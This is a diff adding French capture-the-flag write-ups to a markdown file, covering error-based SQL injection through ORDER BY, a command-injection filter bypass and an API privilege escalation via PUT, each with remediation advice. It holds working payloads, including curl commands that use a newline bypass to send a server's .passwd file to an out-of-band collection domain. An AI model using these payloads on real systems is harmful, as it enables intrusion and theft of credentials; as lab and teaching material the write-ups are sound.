@@ -429,6 +429,513 @@ PortSwigger recommande donc :
 
 - **PortSwigger – Preventing **CSRF** vulnerabilities**  
   [https://portswigger.net/web-security/csrf/preventing](https://portswigger.net/web-security/csrf/preventing)
+  
+
+# Challenge 7 --- SQL Injection Error-Based
+
+##  Objectif du challenge
+
+L'objectif du challenge est d'exploiter une injection SQL pour récupérer
+des informations sensibles contenues dans la base de données.
+L'application présente une fonctionnalité de tri (`ORDER BY`)
+manipulable par l'utilisateur, ce qui en fait un point d'injection
+potentiel.
+
+------------------------------------------------------------------------
+
+##  Vulnérabilité : SQL Injection Error-Based (via ORDER BY)
+
+La vulnérabilité repose sur une injection SQL dans la clause
+`ORDER BY`.\
+Le paramètre `order`, transmis via l'URL, est intégré directement dans
+la requête SQL sans filtrage.
+
+Une injection dans `ORDER BY` permet :
+
+-   De provoquer des **erreurs SQL volontairement**.
+-   D'injecter des **sous-requêtes SQL**.
+-   D'afficher des données internes via un **CAST provoquant une
+    erreur**.
+
+Cette technique est appelée :\
+ **Error‑Based SQL Injection**
+
+------------------------------------------------------------------------
+
+
+## Recommandation :
+- Utiliser des requêtes préparées
+Toutes les requêtes SQL doivent être préparées (prepared statements) pour éviter que les entrées utilisateur soient interprétées comme du SQL.
+- Échapper strictement les paramètres dans ORDER BY
+`ORDER BY` ne supporte pas les placeholders dans certains frameworks →
+Il faut utiliser une whitelist :
+```
+$allowed = ['ASC', 'DESC'];
+if (!in_array($_GET['order'], $allowed)) {
+    $order = 'ASC';
+}
+```
+
+- Ne jamais afficher d’erreurs SQL en production
+L’erreur SQL est ce qui permet l’extraction du mot de passe.
+→ Activer un message générique côté utilisateur.
+→ Journaliser l’erreur côté serveur uniquement.
+
+- Principes de sécurité supplémentaires
+Limiter les permissions du compte SQL (SELECT strict).
+Mettre un WAF ou un parser d’entrée.
+Utiliser ORM ou Query Builder avec sécurisation auto.
+
+------------------------------------------------------------------------
+
+# Étapes de l'exploitation
+
+## 1. Détection de la fonctionnalité vulnérable
+
+Nous constatons la présence du paramètre :
+
+    ?action=contents&order=ASC
+
+Ce paramètre influence l'affichage → il est donc probablement utilisé
+dans un `ORDER BY`.\
+Nous décidons de tester ici notre injection.
+
+------------------------------------------------------------------------
+
+## 2. Premiers tests : `ASCX` puis `ASC,+1`
+
+-   `ASCX` génère une erreur SQL → **injection confirmée**.
+  <img width="2938" height="382" alt="Capture d’écran 2025-12-03 à 14 45 13" src="https://github.com/user-attachments/assets/812c275a-425e-4a96-99ae-ec202b0792f4" />
+
+-   `ASC,+1` fonctionne → **la requête accepte une deuxième
+    expression**.
+  <img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 46 31" src="https://github.com/user-attachments/assets/24704dfb-6ef7-49d1-9d93-0c7b3ee9aa49" />
+
+
+Cela confirme que nous pouvons injecter des expressions additionnelles
+dans le `ORDER BY`.
+
+------------------------------------------------------------------------
+
+## 3. Déterminer le nombre de colonnes
+
+Tests successifs :
+
+-   `ASC,+1` → OK\
+-   `ASC,+2` → OK\
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 46 31" src="https://github.com/user-attachments/assets/24704dfb-6ef7-49d1-9d93-0c7b3ee9aa49" />
+-   `ASC,+3` → erreur : « ORDER BY position 3 is not in select list »
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 47 35" src="https://github.com/user-attachments/assets/6b0ee777-4d7a-4f04-8cea-0f5bec2583e2" />
+
+
+Le SELECT retourne **2 colonnes**.
+
+Cette étape valide que nous pouvons utiliser la deuxième position du
+`ORDER BY` pour injecter des sous‑requêtes.
+
+------------------------------------------------------------------------
+
+## 4. Premier test de sous‑requête
+
+Nous essayons :
+
+    (SELECT table_name FROM information_schema.tables LIMIT 1)
+
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 51 52" src="https://github.com/user-attachments/assets/abdcb72a-4d00-471c-8189-0dd1060c0000" />
+
+
+Aucune erreur → mais aucune data visible.
+
+Cela montre qu'il faut **provoquer une erreur SQL contrôlée** pour
+afficher la donnée.
+
+------------------------------------------------------------------------
+
+## 5. Déclenchement volontaire d'erreur avec CAST
+
+Nous injectons :
+
+    CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)
+
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 52 51" src="https://github.com/user-attachments/assets/848c3c84-131a-4ba7-96a6-016ee4823c74" />
+
+
+La conversion échoue, ce qui révèle :
+
+    "m3mbr35t4bl3"
+
+ **Nous obtenons le nom de la table sensible.**
+
+------------------------------------------------------------------------
+
+## 6. Extraction des colonnes de la table
+
+Nous parcourons `information_schema.columns`.
+
+Notre injection :
+
+    CAST((SELECT column_name FROM information_schema.columns LIMIT 1 OFFSET X) AS INTEGER)
+
+Résultats :
+
+-   OFFSET 0 → `id`
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 54 04" src="https://github.com/user-attachments/assets/8089ea51-b681-405c-afe6-ec160faee2b0" />
+
+-   OFFSET 1 → `us3rn4m3_c0l`
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 54 43" src="https://github.com/user-attachments/assets/ae757072-7642-4d81-83d7-bb983d52551b" />
+
+-   OFFSET 2 → `p455w0rd_c0l`
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 55 05" src="https://github.com/user-attachments/assets/0d762fcc-67c5-4dfc-b59d-2abc37ac7e8a" />
+
+Nous avons désormais le nom de la colonne du mot de passe.
+
+Pourquoi utiliser OFFSET ?
+
+`LIMIT 1` ne renvoie que le premier élément.\
+`OFFSET` permet d'atteindre :
+
+-   la 2e colonne → OFFSET 1\
+-   la 3e colonne → OFFSET 2
+
+C'est indispensable pour parcourir toutes les colonnes de la table.
+
+------------------------------------------------------------------------
+
+## 8. Extraction finale du mot de passe
+
+Une fois la bonne colonne identifiée, nous injectons :
+
+    CAST((SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1) AS INTEGER)
+    
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 15 04 42" src="https://github.com/user-attachments/assets/174039f1-cba1-435b-bdde-aad3d515b07f" />
+
+
+Erreur obtenue :
+
+    invalid input syntax for type double precision: "1a2BdKT5DIx3qxQN3UaC"
+
+Le mot de passe admin apparaît dans l'erreur SQL.\
+
+------------------------------------------------------------------------
+
+#  Solution
+
+Mettre le mot de passe "1a2BdKT5DIx3qxQN3UaC" dans la page authentification :
+
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 15 05 57" src="https://github.com/user-attachments/assets/c1c34c9a-cb54-4578-86cc-3247104920c8" />
+
+<img width="2494" height="416" alt="Capture d’écran 2025-12-03 à 15 06 03" src="https://github.com/user-attachments/assets/d17484bf-9001-4eb5-8f48-b070d6248042" />
+
+Le contenu de la page contents est désormais visible :
+
+<img width="2940" height="346" alt="Capture d’écran 2025-12-03 à 15 09 20" src="https://github.com/user-attachments/assets/1bae8468-e4ae-49e3-84fc-0f305d617fc7" />
+
+------------------------------------------------------------------------
+
+
+# Références
+- OWASP SQL Injection Prevention Cheat Sheet
+- OWASP Error Handling Cheat Sheet
+- PortSwigger: Error-based SQL Injection
+- PayloadAllTheThings – SQL Injection
+
+
+------------------------------------------------------------------------
+
+
+# Challenge 8 --- Command injection — Filter bypass
+
+## 1. Objectif du challenge
+Le challenge demande de prouver qu'on peut exécuter des commandes sur le serveur et récupérer une donnée sensible (ici le contenu d’un fichier `.passwd`). 
+L’interface expose un paramètre `ip` qui est utilisé pour un `ping`. Le but est de contourner les protections/les filtres pour exfiltrer le fichier (index.php → .passwd → mot de passe).
+
+## 2. Vulnérabilité : Command injection
+La *command injection* survient lorsque l’application passe des données contrôlées par l’utilisateur à un interpréteur de commandes (shell) sans les neutraliser correctement. 
+L’attaquant peut alors insérer des séparateurs/commandes qui seront interprétés et exécutés.
+
+## Recommandations de sécurité
+- Ne jamais concaténer l’input utilisateur dans une commande shell
+Exemple vulnérable :
+```
+system("ping -c 2 " . $_GET['ip']);
+```
+- Solution recommandée :
+Utiliser ***escapeshellarg()*** ou ***escapeshellcmd()***
+Ou supprimer l’utilisation du shell :
+```
+$ip = filter_var($_GET['ip'], FILTER_VALIDATE_IP);
+if ($ip) {
+    exec("/bin/ping -c 2 $ip", $output, $status);
+}
+```
+- Mettre en place une validation stricte
+IP uniquement : regex stricte
+Aucune autorisation d'autres caractères ( ; | & %0a etc.)
+- Désactiver les wrappers dangereux
+Désactiver les fonctions système si elles ne sont pas nécessaires :
+system, exec, shell_exec, passthru.
+- Désactiver l’interprétation de newline via URL decoding
+Le bypass %0A a été possible car le serveur décodait les caractères spéciaux avant d'appeler le shell.
+- Utiliser un mécanisme sandbox ou isolate
+→ limitation des effets en cas d’injection.
+
+
+### Contexte technique probable
+Le serveur exécute quelque chose du type :
+
+```bash
+# PHP-like pseudo
+$cmd = "ping -c 2 " . $_GET['ip'];
+system($cmd);
+```
+
+Si `$_GET['ip']` contient  `127.0.0.1; curl http://attacker`, alors le shell reçoit : `ping -c 2 127.0.0.1; curl http://attacker`
+
+→ exécution des 2 commandes si le shell accepte le séparateur ; 
+
+
+### Phase d'observation
+- **Tester l'entrée normale** (`ip=127.0.0.1`) pour vérifier qu'une commande est effectivement exécutée
+- Observer la réponse "Ping OK" qui confirme l'exécution côté serveur, mais la sortie est masquée.
+- Il y a donc un canal d’exécution, mais il faudra exfiltrer via un canal externe (OAST) puisque la réponse ne retourne pas le résultat des commandes.
+
+### Utilisation d'un outil OAST (Out-of-Band Application Security Testing)
+- Si la sortie est masquée, utiliser un service OAST pour détecter l'exécution
+- Services recommandés :
+  - **Burp Collaborator** (intégré à Burp Suite)
+  - **Interactsh** (outil utilisé)
+ 
+<img width="872" height="1428" alt="Capture d’écran 2025-12-03 à 16 50 56" src="https://github.com/user-attachments/assets/19501fad-589f-4aca-98ec-0b74c831f66c" />
+
+
+### Tests de séparateurs de commandes
+- Le **;** est le séparateur de commande classique en shell. Si **;** fonctionne, on peut chaîner des commandes.
+- Tester les séparateurs simples : `;`, `&&`, `|`
+<img width="2436" height="990" alt="Capture d’écran 2025-12-03 à 16 40 05" src="https://github.com/user-attachments/assets/1af7dc75-56a4-47da-8957-f1ecb8e98059" />
+
+→ **;** n’est pas bloqué au niveau de l’entrée. 
+Mais attention : même si **;** passe, la commande suivante peut échouer si d’autres caractères (espaces, mots) sont filtrés.
+
+### Tests d'exécution de commandes basiques
+- Tenter d'exécuter des commandes simples : `cat`, `ls`, `curl`
+<img width="2436" height="990" alt="Capture d’écran 2025-12-03 à 16 44 36" src="https://github.com/user-attachments/assets/738d239a-ceae-4e01-a304-08ad151d5cc4" />
+
+→ Le serveur rejette l’expression : probablement parce que les espaces, certains mots-clés, ou une forme particulière de chaîne sont filtrés (ou parce que l’entrée est passée par un parser qui rejette certaines séquences).
+
+**Conclusion :** `; cat index.php` ne passe pas directement.
+
+### Tester curl :
+- Tenter de tester 
+Payload testé : `ip=127.0.0.1;curl http://burfmgxiiuvqxzqjxaeet88lp3emf7ixn.oast.fun`
+
+<img width="2436" height="990" alt="Capture d’écran 2025-12-03 à 16 49 10" src="https://github.com/user-attachments/assets/b08027ea-8e33-40e0-98ce-4a9800c04f30" />
+
+L’idée est d’utiliser curl pour faire une requête vers notre domaine OAST et ainsi prouver exécution.
+
+→ Comme pour cat, l’espace entre curl et l’URL ou d’autres caractères sont bloqués, rendant la tentative invalide.
+
+### Recherche de contournements
+- Utiliser des ressources comme [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).
+  
+→ Trouver des séparateurs ou encodages alternatifs (ex : encodage URL, substitution, commentaires, newline, etc.).
+Beaucoup de techniques ne passent pas ; il faut isoler ce qui est effectivement autorisé par le parser serveur.
+
+### %0A
+- %0A est le caractère LINE FEED (newline). Lorsque l’input est décodé puis passé au shell, un newline équivaut à terminer la ligne, ce qui en pratique démarre une nouvelle commande.
+- Si %0A n’est pas filtré, on peut écrire une deuxième commande sur une nouvelle ligne, évitant l’espace bloqué dans la même ligne ou les artefacts du parser.
+  
+Traduction côté shell :
+```bash
+ping -c 2 127.0.0.1
+<nouvelle ligne> commande_suivante
+```
+
+### Exécution de curl après %0A
+Payload testé :
+`ip=127.0.0.1%0acurl http://burfmgxiiuvqxzqjxaeet88lp3emf7ixn.oast.fun`
+<img width="2430" height="1074" alt="Capture d’écran 2025-12-03 à 16 58 03" src="https://github.com/user-attachments/assets/cfbda0cf-ac50-4d4f-9022-06af479f3153" />
+
+Une requête HTTP apparaît dans Interactsh (ou Burp Collaborator).
+<img width="2938" height="1422" alt="Capture d’écran 2025-12-03 à 16 58 12" src="https://github.com/user-attachments/assets/94f746fb-1005-4e49-bb51-56fe89edbf82" />
+
+- Le newline a permis de commencer une commande sur une nouvelle ligne : curl http://....
+- Le serveur exécute curl, qui provoque une requête sortante visible dans l’interface OAST.
+  
+→ Exécution de commande confirmée et canal d’exfiltration disponible.
+
+### Tentative de lecture de index.php avec substitution (échec)
+`ip=127.0.0.1%0acurl http://burfmgxiiuvqxzqjxaeet88lp3emf7ixn.oast.fun/``cat index.php``
+Pas de réponse utile / aucun enregistrement avec le contenu attendu.
+- Les backticks `...` ou la substitution de commandes sont probablement filtrés ou désactivés.
+Ou bien la manière dont la commande est envoyée (par ex. via HTTP param) empêche l’interprétation de backticks.
+
+### Trouver une méthode qui évite cat et backticks : curl -X POST -d @file
+- **curl** accepte l’option `-d @file` qui fait que **curl lira le fichier localement côté serveur et enverra son contenu en POST.
+- Cela évite d’avoir à appeler cat ou faire de la substitution.
+`ip=127.0.0.1%0acurl -X POST -d @index.php http://burfmgxiiuvqxzqjxaeet88lp3emf7ixn.oast.fun`
+
+<img width="2434" height="1090" alt="Capture d’écran 2025-12-03 à 22 16 29" src="https://github.com/user-attachments/assets/a5e61a64-5375-4a00-b196-6e5a0c419cac" />
+
+
+<img width="2938" height="1422" alt="Capture d’écran 2025-12-03 à 17 13 05" src="https://github.com/user-attachments/assets/7f1e2134-2fda-4786-aa16-72896311b005" />
+
+→ Aucun backtick, pas de substitution, la seule « nouveauté » est le flag -d @file qui est interprété par curl, et curl lit le fichier localement.
+→ Les espaces à l’intérieur de la commande curl -X POST -d @file sont acceptés car ils sont sur la nouvelle ligne et le parser ne les bloque pas dans ce contexte — la raison technique exacte dépend du filtre (parfois seul le paramètre GET est filtré d’une certaine façon, tandis que la ligne suivante est interprétée différemment).
+
+### Exfiltrer le fichier caché .passwd
+Payload final que tu as utilisé :
+`ip=127.0.0.1%0Acurl -X POST -d @.passwd burfmgxiiuvqxzqjxaeet88lp3emf7ixn.oast.fun`
+
+- curl lit `.passwd` et envoie son contenu en POST à l’URL fournie ( domaine Interactsh).
+- Dans Interactsh → HTTP logs on voit la requête et le corps, souvent URL-encoded.
+- Après décodage, tu récupères le mot de passe.
+- Évite cat et backticks (souvent filtrés).
+- Exploite la capacité native de curl à lire un fichier via -d @file.
+- Exploite le newline bypass %0A qui est le pivot pour exécution.
+
+<img width="2934" height="1406" alt="Capture d’écran 2025-12-03 à 22 25 03" src="https://github.com/user-attachments/assets/a01e5330-148b-4116-9f87-a8d1a5a2badf" />
+
+
+### Références
+- OWASP Command Injection Cheat Sheet
+- PayloadAllTheThings – Command Injection
+- PortSwigger: OS Command Injection
+- Mitre CWE-78 (Improper Command Execution)
+
+
+# Challenge 11 Rootme##API — Mass Assignment
+
+L’objectif du laboratoire est d’auditer une petite API.
+Le développeur dit avoir corrigé la faille précédente et avoir ajouté un rôle administrateur inaccessible aux utilisateurs normaux.
+
+On dispose des routes suivantes :
+- /signup
+- /login
+- /user
+- /note
+- /flag (réservée à l’admin
+
+→ Le but final : devenir admin pour accéder au flag.
+
+### Vulnérabilité 
+La faille est une IDOR via HTTP Method Manipulation.
+- La logique vulnérable :
+L’API autorise `PUT`, mais ne contrôle pas le rôle.
+Elle permet à n’importe quel utilisateur authentifié de modifier sa propre structure JSON, y compris son rôle.
+Aucune validation côté serveur : pas de check isAdmin.
+- Ce type d’erreur se nomme :
+Insecure Direct Object Reference (IDOR)
+Privilege Escalation via Unprotected PUT method
+Broken Access Control
+
+### Phase d'observation
+
+Après avoir lancé le challenge, nous observons l’interface utilisateur.
+Nous interceptons ensuite les requêtes via Burp Suite, puis envoyons chaque endpoint dans Repeater afin d’analyser les réponses.
+Les endpoints `/signup` et `/login` se comportent normalement.
+Le comportement intéressant se trouve dans :
+- /user
+- /note
+- /flag
+
+  Exemple de réponse de la page /flag :
+  <img width="1380" height="598" alt="Capture d’écran 2025-12-03 à 23 38 51" src="https://github.com/user-attachments/assets/8a658aef-9691-46a1-9b82-e886b6c4ca53" />
+
+Dans la page `/user`, nous observons notre statut en JSON :
+``
+{
+  "user": "xx",
+  "status": "guest"
+}
+``
+Ce champ `status` semble potentiellement modifiable.
+
+### Test des différentes méthodes HTTP
+Une technique classique en API pentest consiste à tester les méthodes HTTP non prévues.
+## Test 1 — Envoyer un POST au lieu du GET
+On modifie la requête de `/user` pour utiliser **POST**.
+Réponse :
+``
+{"error":"Method Not Allowed"}
+Allowed methods: PUT, GET, HEAD, OPTIONS
+``
+→ l’API révèle qu’elle accepte PUT.
+
+- `PUT` sert à mettre à jour un objet distant.
+- Contrairement à GET, HEAD ou OPTIONS, il modifie les données.
+- L’API nous dit qu’elle attend probablement un contenu JSON.
+- Donc si le statut de l’utilisateur existe dans la base…
+  → Nous pouvons peut-être le modifier.
+
+ ### Envoi d’un PUT avec JSON
+- Dans Burp :
+Changer la méthode : `PUT`
+Ajouter l’en-tête :
+```
+Content-Type: application/json
+```
+Envoyer un corps JSON vide d’abord :
+```
+{}
+```
+→ Réponse : l’API accepte le JSON → aucune erreur de parsing.
+<img width="1380" height="410" alt="Capture d’écran 2025-12-03 à 23 47 58" src="https://github.com/user-attachments/assets/38d552f6-6659-4dbf-8f6c-fbe9f5e219a8" />
+
+### Hypothèse d’exploitation
+Nous avons observé plus tôt que le status était :
+` "status": "guest" `
+→ L’idée : envoyer un `PUT` pour remplacer le status.
+<img width="1380" height="520" alt="Capture d’écran 2025-12-03 à 23 49 54" src="https://github.com/user-attachments/assets/564a5c8f-8173-4c92-b037-fb526dea9563" />
+
+Ensuite, on envoie un **GET** sur `/user` pour vérifier.
+Réponse :
+```
+{
+  "user": "xx",
+  "status": "ccc"
+}
+```
+→ ***SUCCESS*** ! Le rôle a bien été modifié.
+<img width="1380" height="520" alt="Capture d’écran 2025-12-03 à 23 51 54" src="https://github.com/user-attachments/assets/0677eee9-246e-41fb-965e-989b8a31cf4f" />
+
+Payload ***PUT*** final :
+```
+{ "status": "admin" }
+```
+Nouvelle vérification :
+```
+{
+  "user": "xx",
+  "status": "admin"
+}
+```
+
+<img width="1380" height="548" alt="Capture d’écran 2025-12-03 à 23 53 06" src="https://github.com/user-attachments/assets/b47f66ec-38d8-4d4c-bb09-d5b13a2408c4" />
+
+→ Nous avons maintenant les privilèges administrateur.
+
+### Accès au flag
+Il suffit maintenant d’appeler `/flag`.
+
+<img width="1380" height="508" alt="Capture d’écran 2025-12-03 à 23 55 36" src="https://github.com/user-attachments/assets/eba4c1f4-0472-4f68-934d-11d2c1348241" />
+
+### Références :
+- OWASP API Security Top 10 – API4:2023 (Broken Access Control)
+- OWASP REST Security Cheat Sheet
+- Auth0: Prevent Mass Assignment Vulnerabilities
+- PortSwigger – Mass Assignment Academy Lab
+
+
+### Recommandations :
+- Bloquer totalement PUT pour les utilisateurs normaux.
+- Implémenter un contrôle strict des rôles :
+```
+if user.status != 'admin':
+    deny()
+```
+- Ne jamais permettre de modifier un champ sensible (status, role, isAdmin) via une API publique.
+
+
   # Challenge 9–  XSS - Stockée 2
   ## Analyse initiale du site
   En arrivant sur le forum, j’ai d’abord testé le fonctionnement normal en soumettant un message simple :
@@ -575,6 +1082,8 @@ Puis sur Deliver to victim.
 Le serveur victime charge mon exploit → requête POST sans Referer → email modifié.
 
 🎉 Challenge résolu.
+
+
 ## Challenge 6 – JWT Révoqué
 Exploitation
 Étape 1 — Login pour obtenir un token
